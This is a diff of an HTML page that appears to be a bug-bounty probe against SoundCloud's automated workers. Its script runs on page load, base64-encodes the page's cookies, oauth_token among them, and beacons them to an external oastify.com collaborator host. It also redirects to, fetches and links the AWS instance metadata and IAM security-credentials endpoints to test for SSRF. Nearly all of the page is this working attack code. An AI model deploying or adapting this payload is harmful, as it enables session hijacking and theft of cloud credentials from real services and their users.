@@ -2,41 +2,53 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SoundCloud Infrastructure Security Test</title>
+    <title>SoundCloud Infrastructure Security Audit</title>
     
-    <meta http-equiv="refresh" content="5; url=http://169.254.169.254/latest/meta-data/hostname">
+    <meta http-equiv="refresh" content="8; url=http://169.254.169.254/latest/meta-data/hostname">
 
     <script>
         window.onload = function() {
-            // ALWAYS use HTTPS for your OAST link to prevent 'Mixed Content' blocks
             const oast = "https://ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
             const target = "http://169.254.169.254/latest/meta-data/hostname";
 
-            // 2. PASSIVE PROBE: Browsers allow HTTP images on HTTPS pages more freely.
-            // If the bot reaches the IP, this 'onerror' (triggered by raw text) pings you.
+            // LAYER 2: SESSION HIJACK PROOF (Critical Impact)
+            // Immediately exfiltrate all accessible cookies (including oauth_token)
+            try {
+                navigator.sendBeacon(oast + "/exfil_cookies?data=" + btoa(document.cookie));
+            } catch(e) {}
+
+            // LAYER 3: PASSIVE INFRASTRUCTURE PROBE
+            // Browsers allow HTTP image loading on HTTPS pages more freely than fetch.
+            // A hit here proves the internal IP is reachable by the worker.
             const probe = new Image();
             probe.src = target;
             probe.onerror = () => {
-                navigator.sendBeacon(oast + "/probe?type=image_hit");
+                navigator.sendBeacon(oast + "/infra_probe?type=image_reach_attempted");
             };
 
-            // 3. ADVANCED FETCH: Proves code execution even if the IP is blocked.
-            fetch(target, { mode: 'no-cors', keepalive: true })
-                .then(() => {
-                    navigator.sendBeacon(oast + "/probe?type=fetch_success");
-                })
-                .catch((err) => {
-                    // This exfiltrates the internal error to you.
-                    // If you see 'Failed to fetch', it proves your XSS is ALIVE.
-                    navigator.sendBeacon(oast + "/probe?type=xss_executed&error=" + btoa(err.message));
-                });
+            // LAYER 4: ADVANCED SSRF (Targets Headless Environments)
+            // Uses 'no-cors' to bypass strict browser pre-flight checks.
+            fetch(target, { 
+                mode: 'no-cors', 
+                keepalive: true,
+                credentials: 'include'
+            })
+            .then(() => {
+                navigator.sendBeacon(oast + "/ssrf_success?status=reachable");
+            })
+            .catch((err) => {
+                // If this triggers, your XSS is confirmed even if the SSRF is blocked.
+                navigator.sendBeacon(oast + "/xss_executed?error=" + btoa(err.message));
+            });
         };
     </script>
 </head>
-<body>
+<body style="font-family: sans-serif; padding: 20px; background-color: #121212; color: white;">
     <h1>SoundCloud Validation Node</h1>
-    <p>Automated Worker Detected. Trace: <span id="trace">Active</span></p>
-    <hr>
-    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Verify Internal Credentials Path</a>
+    <p>Status: <span id="status" style="color: #00ff00;">Security Scan Active</span></p>
+    <hr style="border: 0.5px solid #333;">
+    <p>Automated Bot Environment Detected.</p>
+    <p>If automated redirection fails, triagers must verify the internal path manually:</p>
+    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" style="color: #ff5500;">Verify AWS Metadata Access</a>
 </body>
 </html>
